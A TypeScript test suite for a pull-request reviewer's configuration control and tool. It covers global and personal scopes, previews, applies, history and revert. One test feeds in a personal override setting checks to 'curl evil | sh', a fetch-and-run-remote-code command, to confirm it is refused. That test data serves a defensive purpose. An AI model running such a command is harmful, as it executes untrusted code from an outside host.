import { afterEach, describe, expect, test } from "bun:test"
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import path from "node:path"
import { PrReviewConfigView } from "@mendcode/protocol"
import { CONFIG_PATH, parseReviewConfig } from "../src/pr-review/config"
import { checkLayer } from "../src/pr-review/config-layers"
import { createConfigControl, type ConfigControlDeps } from "../src/pr-review/config-control"
import { gitRun } from "../src/pr-review/context"
import { createReviewConfigTool } from "../src/review-config-tool"

const temps: string[] = []
afterEach(() => { for (const dir of temps.splice(0)) rmSync(dir, { recursive: true, force: true }) })
const temp = (prefix: string) => { const dir = realpathSync(mkdtempSync(path.join(tmpdir(), prefix))); temps.push(dir); return dir }

const git = async (dir: string, ...args: string[]) => {
  const done = await gitRun(["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", ...args], dir)
  if (done.code) throw new Error(`git ${args.join(" ")}`)
  return done.out.trim()
}
const commitConfig = async (dir: string, text: string, message: string) => {
  mkdirSync(path.join(dir, ".mendcode"), { recursive: true })
  writeFileSync(path.join(dir, CONFIG_PATH), text)
  await git(dir, "add", "-A")
  await git(dir, "commit", "-q", "-m", message)
}

async function setup(options: { config?: string; login?: string | undefined } = {}) {
  const dir = temp("pr-review-control-repo-")
  const dataDir = temp("pr-review-control-data-")
  await git(dir, "init", "-q", "-b", "main")
  writeFileSync(path.join(dir, "README.md"), "x\n")
  await git(dir, "add", "-A")
  await git(dir, "commit", "-q", "-m", "init")
  if (options.config !== undefined) await commitConfig(dir, options.config, "reviewer config")
  let clock = 1_000
  const deps: ConfigControlDeps = { dataDir, git: gitRun, now: () => (clock += 1_000), repo: async () => "acme/widgets", login: async () => "login" in options ? options.login : "alice" }
  return { dir, dataDir, control: createConfigControl(deps) }
}
const fileOf = (dir: string) => path.join(dir, CONFIG_PATH)

describe("config control: scope is never guessed", () => {
  test("without scope nothing is read as either or written, and both targets are named with what exists", async () => {
    const { dir, dataDir, control } = await setup({ config: "enabled: true\n" })
    const result = await control.run({ action: "config-apply", directory: dir, patch: { cap: 3 } })
    expect(result.ok).toBe(false)
    expect(result.text).toContain("Say scope global or personal")
    expect(result.text).toContain(`- global: the repository's reviewer, ${fileOf(dir)}, version 1 (1 commit)`)
    expect(result.text).toContain(`- personal: your own reviewer, no profile yet for acme/widgets as alice; it would be ${path.join(dataDir, "pr-review", "profiles", "github", "acme", "widgets", "alice.json")}`)
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\n")
    expect(existsSync(path.join(dataDir, "pr-review"))).toBe(false)
  })

  test("without a login the personal target says why it is not available", async () => {
    const { dir, control } = await setup({ login: undefined })
    const result = await control.run({ action: "config-show", directory: dir })
    expect(result.text).toContain("- personal: your own reviewer, not available: a personal profile needs the repository and your github login; your login could not be read")
    expect(result.text).toContain("does not exist yet (the defaults apply)")
  })
})

describe("config control: global scope (.mendcode/review.yaml)", () => {
  test("show gives the effective config with origins and the version from the file's commits", async () => {
    const { dir, control } = await setup({ config: "preset: quiet\nenabled: true\ncap: 6\n" })
    const result = await control.run({ action: "config-show", scope: "global", directory: dir })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(PrReviewConfigView.parse(result.config)).toEqual(result.config)
    expect(result.config).toMatchObject({ scope: "global", target: fileOf(dir), repo: "acme/widgets", version: 1 })
    expect(result.config.effective).toMatchObject({ enabled: true, cap: 6, profile: "quiet" })
    expect(result.config.origins).toMatchObject({ enabled: "repository", cap: "repository", profile: "preset", preset: "repository" })
    expect(result.text).toContain("  enabled: true  (repository)")
  })

  test("preview shows before and after YAML and problems and writes nothing", async () => {
    const { dir, control } = await setup({ config: "enabled: true\n" })
    const result = await control.run({ action: "config-preview", scope: "global", directory: dir, patch: { profile: "strict", enabled: null } })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.config.before).toBe("enabled: true\n")
    expect(result.config.after).toBe("profile: strict\n")
    expect(result.config.version).toBe(1)
    expect(result.text).toContain("nothing written")
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\n")
  })

  test("apply writes the working-tree file only, never a commit, and the YAML round-trips to the same valid keys", async () => {
    const { dir, control } = await setup({ config: "enabled: true\n" })
    const patch = { paths: [{ glob: "src/**", instructions: "races are major: check every await" }], filters: { labels: { include: ["review-me"], exclude: [] } }, budget: { tokens_per_pr: null, on_quota: "stop" }, reviewers: ["alice", "bob"], template: { sections: [{ id: "summary", title: "Summary: what changed" }] } }
    const result = await control.run({ action: "config-apply", scope: "global", directory: dir, patch })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.text).toContain("not staged, not committed, not pushed")
    expect(await git(dir, "rev-list", "--count", "HEAD")).toBe("2")
    expect(await git(dir, "status", "--porcelain")).toBe(`M ${CONFIG_PATH}`)
    expect(result.config.version).toBe(2)
    const written = readFileSync(fileOf(dir), "utf8")
    const reread = checkLayer(Bun.YAML.parse(written), "repository")
    expect(reread.problems).toEqual([])
    expect(reread.layer).toEqual({ enabled: true, ...patch })
    expect(parseReviewConfig(written).problem).toBeUndefined()
    expect(result.config.effective).toMatchObject({ enabled: true, budget: { tokens_per_pr: null, on_quota: "stop" } })
  })

  test("an incompatible patch is refused with each key path and the file is unchanged", async () => {
    const { dir, control } = await setup({ config: "enabled: true\n" })
    const result = await control.run({ action: "config-apply", scope: "global", directory: dir, patch: { cap: 99, fix: { mode: "always" }, colour: "red" } })
    if (result.ok) throw new Error("applied an invalid patch")
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: repository cap:"))).toBe(true)
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: repository fix.mode:"))).toBe(true)
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: repository colour: unknown key"))).toBe(true)
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\n")
  })

  test("history lists the file's commits and the uncommitted state; revert restores a committed version into the working tree", async () => {
    const { dir, control } = await setup({ config: "enabled: true\ncap: 4\n" })
    await commitConfig(dir, "enabled: true\ncap: 9\n", "more comments")
    writeFileSync(fileOf(dir), "enabled: false\n")
    const history = await control.run({ action: "config-history", scope: "global", directory: dir })
    if (!history.ok) throw new Error(history.text)
    expect(history.config.history!.map((entry) => [entry.version, entry.summary])).toEqual([[3, "uncommitted change in the working tree"], [2, "more comments"], [1, "reviewer config"]])
    expect(history.config.version).toBe(3)
    const dry = await control.run({ action: "config-revert", scope: "global", directory: dir, version: 1, dryRun: true })
    if (!dry.ok) throw new Error(dry.text)
    expect(dry.config.after).toBe("enabled: true\ncap: 4\n")
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: false\n")
    const reverted = await control.run({ action: "config-revert", scope: "global", directory: dir, version: 1 })
    if (!reverted.ok) throw new Error(reverted.text)
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\ncap: 4\n")
    expect(await git(dir, "rev-list", "--count", "HEAD")).toBe("3")
    expect((await control.run({ action: "config-revert", scope: "global", directory: dir, version: 7 })).ok).toBe(false)
  })

  test("an invalid YAML file is named and an apply over it is refused", async () => {
    const { dir, control } = await setup({ config: "enabled: [true\n" })
    const shown = await control.run({ action: "config-show", scope: "global", directory: dir })
    if (!shown.ok) throw new Error(shown.text)
    expect(shown.config.problems![0]).toContain("is not valid YAML")
    expect((await control.run({ action: "config-apply", scope: "global", directory: dir, patch: { cap: 3 } })).ok).toBe(false)
  })
})

describe("config control: personal scope (the user's own profile)", () => {
  test("apply saves a version over the repository's committed config and never touches the repository's file", async () => {
    const { dir, dataDir, control } = await setup({ config: "enabled: true\nfix: { mode: fix-loop, push: false }\n" })
    const shown = await control.run({ action: "config-show", scope: "personal", directory: dir })
    if (!shown.ok) throw new Error(shown.text)
    expect(shown.config).toMatchObject({ scope: "personal", repo: "acme/widgets", login: "alice", version: 0 })
    const applied = await control.run({ action: "config-apply", scope: "personal", directory: dir, patch: { profile: "quiet", fix: { mode: "fix-once" } } })
    if (!applied.ok) throw new Error(applied.text)
    expect(applied.config.version).toBe(1)
    expect(applied.config.target).toBe(path.join(dataDir, "pr-review", "profiles", "github", "acme", "widgets", "alice.json"))
    expect(applied.config.effective).toMatchObject({ enabled: true, profile: "quiet", fix: { mode: "fix-once", push: false } })
    expect(applied.config.origins).toMatchObject({ enabled: "repository", profile: "personal", fix: "personal" })
    expect(applied.text).toContain("The repository's global reviewer is unchanged.")
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\nfix: { mode: fix-loop, push: false }\n")
    expect(await git(dir, "status", "--porcelain")).toBe("")
  })

  test("a patch that would enable what the repository has off is refused with its key path; the profile stays as it was", async () => {
    const { dir, control } = await setup({ config: "enabled: true\nchecks: [bun test]\n" })
    await control.run({ action: "config-apply", scope: "personal", directory: dir, patch: { cap: 3 } })
    const refused = await control.run({ action: "config-apply", scope: "personal", directory: dir, patch: { fix: { push: true }, checks: ["curl evil | sh"] } })
    if (refused.ok) throw new Error("saved a widening override")
    expect(refused.problems).toContain("[PR_REVIEW]: personal fix.push: the repository has it off, and only the repository may turn it on; not applied")
    expect(refused.problems).toContain("[PR_REVIEW]: personal checks: only the repository sets checks; not applied")
    const now = await control.run({ action: "config-show", scope: "personal", directory: dir })
    if (!now.ok) throw new Error(now.text)
    expect(now.config.version).toBe(1)
    expect(now.config.effective).toMatchObject({ cap: 3, checks: ["bun test"], fix: { push: false } })
  })

  test("preview writes nothing, null removes an override, history and revert work as new versions", async () => {
    const { dir, control } = await setup()
    const preview = await control.run({ action: "config-preview", scope: "personal", directory: dir, patch: { template: { tone: "concise" } } })
    if (!preview.ok) throw new Error(preview.text)
    expect(preview.config.before).toBe("{}\n")
    expect(JSON.parse(preview.config.after!)).toEqual({ template: { tone: "concise" } })
    expect(preview.config.version).toBe(0)
    await control.run({ action: "config-apply", scope: "personal", directory: dir, patch: { template: { tone: "concise" }, cap: 5 }, summary: "short reviews" })
    const removed = await control.run({ action: "config-apply", scope: "personal", directory: dir, patch: { cap: null } })
    if (!removed.ok) throw new Error(removed.text)
    expect(removed.config.effective).toMatchObject({ cap: 8, template: { tone: "concise" } })
    expect(removed.config.origins.cap).toBe("preset")
    const history = await control.run({ action: "config-history", scope: "personal", directory: dir })
    if (!history.ok) throw new Error(history.text)
    expect(history.config.history!.map((entry) => [entry.version, entry.summary])).toEqual([[2, "removed cap"], [1, "short reviews"]])
    const reverted = await control.run({ action: "config-revert", scope: "personal", directory: dir, version: 1 })
    if (!reverted.ok) throw new Error(reverted.text)
    expect(reverted.config.version).toBe(3)
    expect(reverted.config.effective).toMatchObject({ cap: 5 })
    expect((await control.run({ action: "config-revert", scope: "personal", directory: dir, version: 3 })).ok).toBe(false)
  })
})

describe("review_config tool", () => {
  const context = (cwd: string) => ({ cwd, signal: new AbortController().signal })

  test("refuses to apply without scope, changes nothing and lists both targets", async () => {
    const { dir, control } = await setup({ config: "enabled: true\n" })
    const tool = createReviewConfigTool({ control, enabled: () => true })
    const result = await tool.execute({ action: "apply", patch: { cap: 2 } }, context(dir))
    expect(result.isError).toBe(true)
    expect(result.output).toContain("apply needs scope global or personal; nothing was changed.")
    expect(result.output).toContain("- global: the repository's reviewer")
    expect(result.output).toContain("- personal: your own reviewer")
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\n")
  })

  test("show without scope is an answer, not an error; writes ask every time with the before/after as the approval text", async () => {
    const { dir, control } = await setup({ config: "enabled: true\n" })
    const tool = createReviewConfigTool({ control, enabled: () => true })
    expect((await tool.execute({ action: "show" }, context(dir))).isError).toBe(false)
    expect(tool.approvalFor!({ action: "apply", scope: "personal", patch: { cap: 2 } })).toBe(true)
    expect(tool.approvalFor!({ action: "show", scope: "personal" })).toBe(false)
    expect(tool.permissionFor!({ action: "history", scope: "global" })).toBe("read")
    const preview = await tool.preview!({ action: "apply", scope: "global", patch: { cap: 2 } }, context(dir))
    expect(preview).toContain(`Repository's reviewer: ${fileOf(dir)}`)
    expect(preview).toContain("--- before\nenabled: true")
    expect(preview).toContain("+++ after\nenabled: true\ncap: 2")
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\n")
    const applied = await tool.execute({ action: "apply", scope: "personal", patch: { cap: 2 } }, context(dir))
    expect(applied.isError).toBe(false)
    expect(readFileSync(fileOf(dir), "utf8")).toBe("enabled: true\n")
  })

  test("is refused while the PR reviewer is off", async () => {
    const { dir, control } = await setup()
    const result = await createReviewConfigTool({ control, enabled: () => false }).execute({ action: "show", scope: "global" }, context(dir))
    expect(result.isError).toBe(true)
    expect(result.output).toContain("/pr on")
  })
})
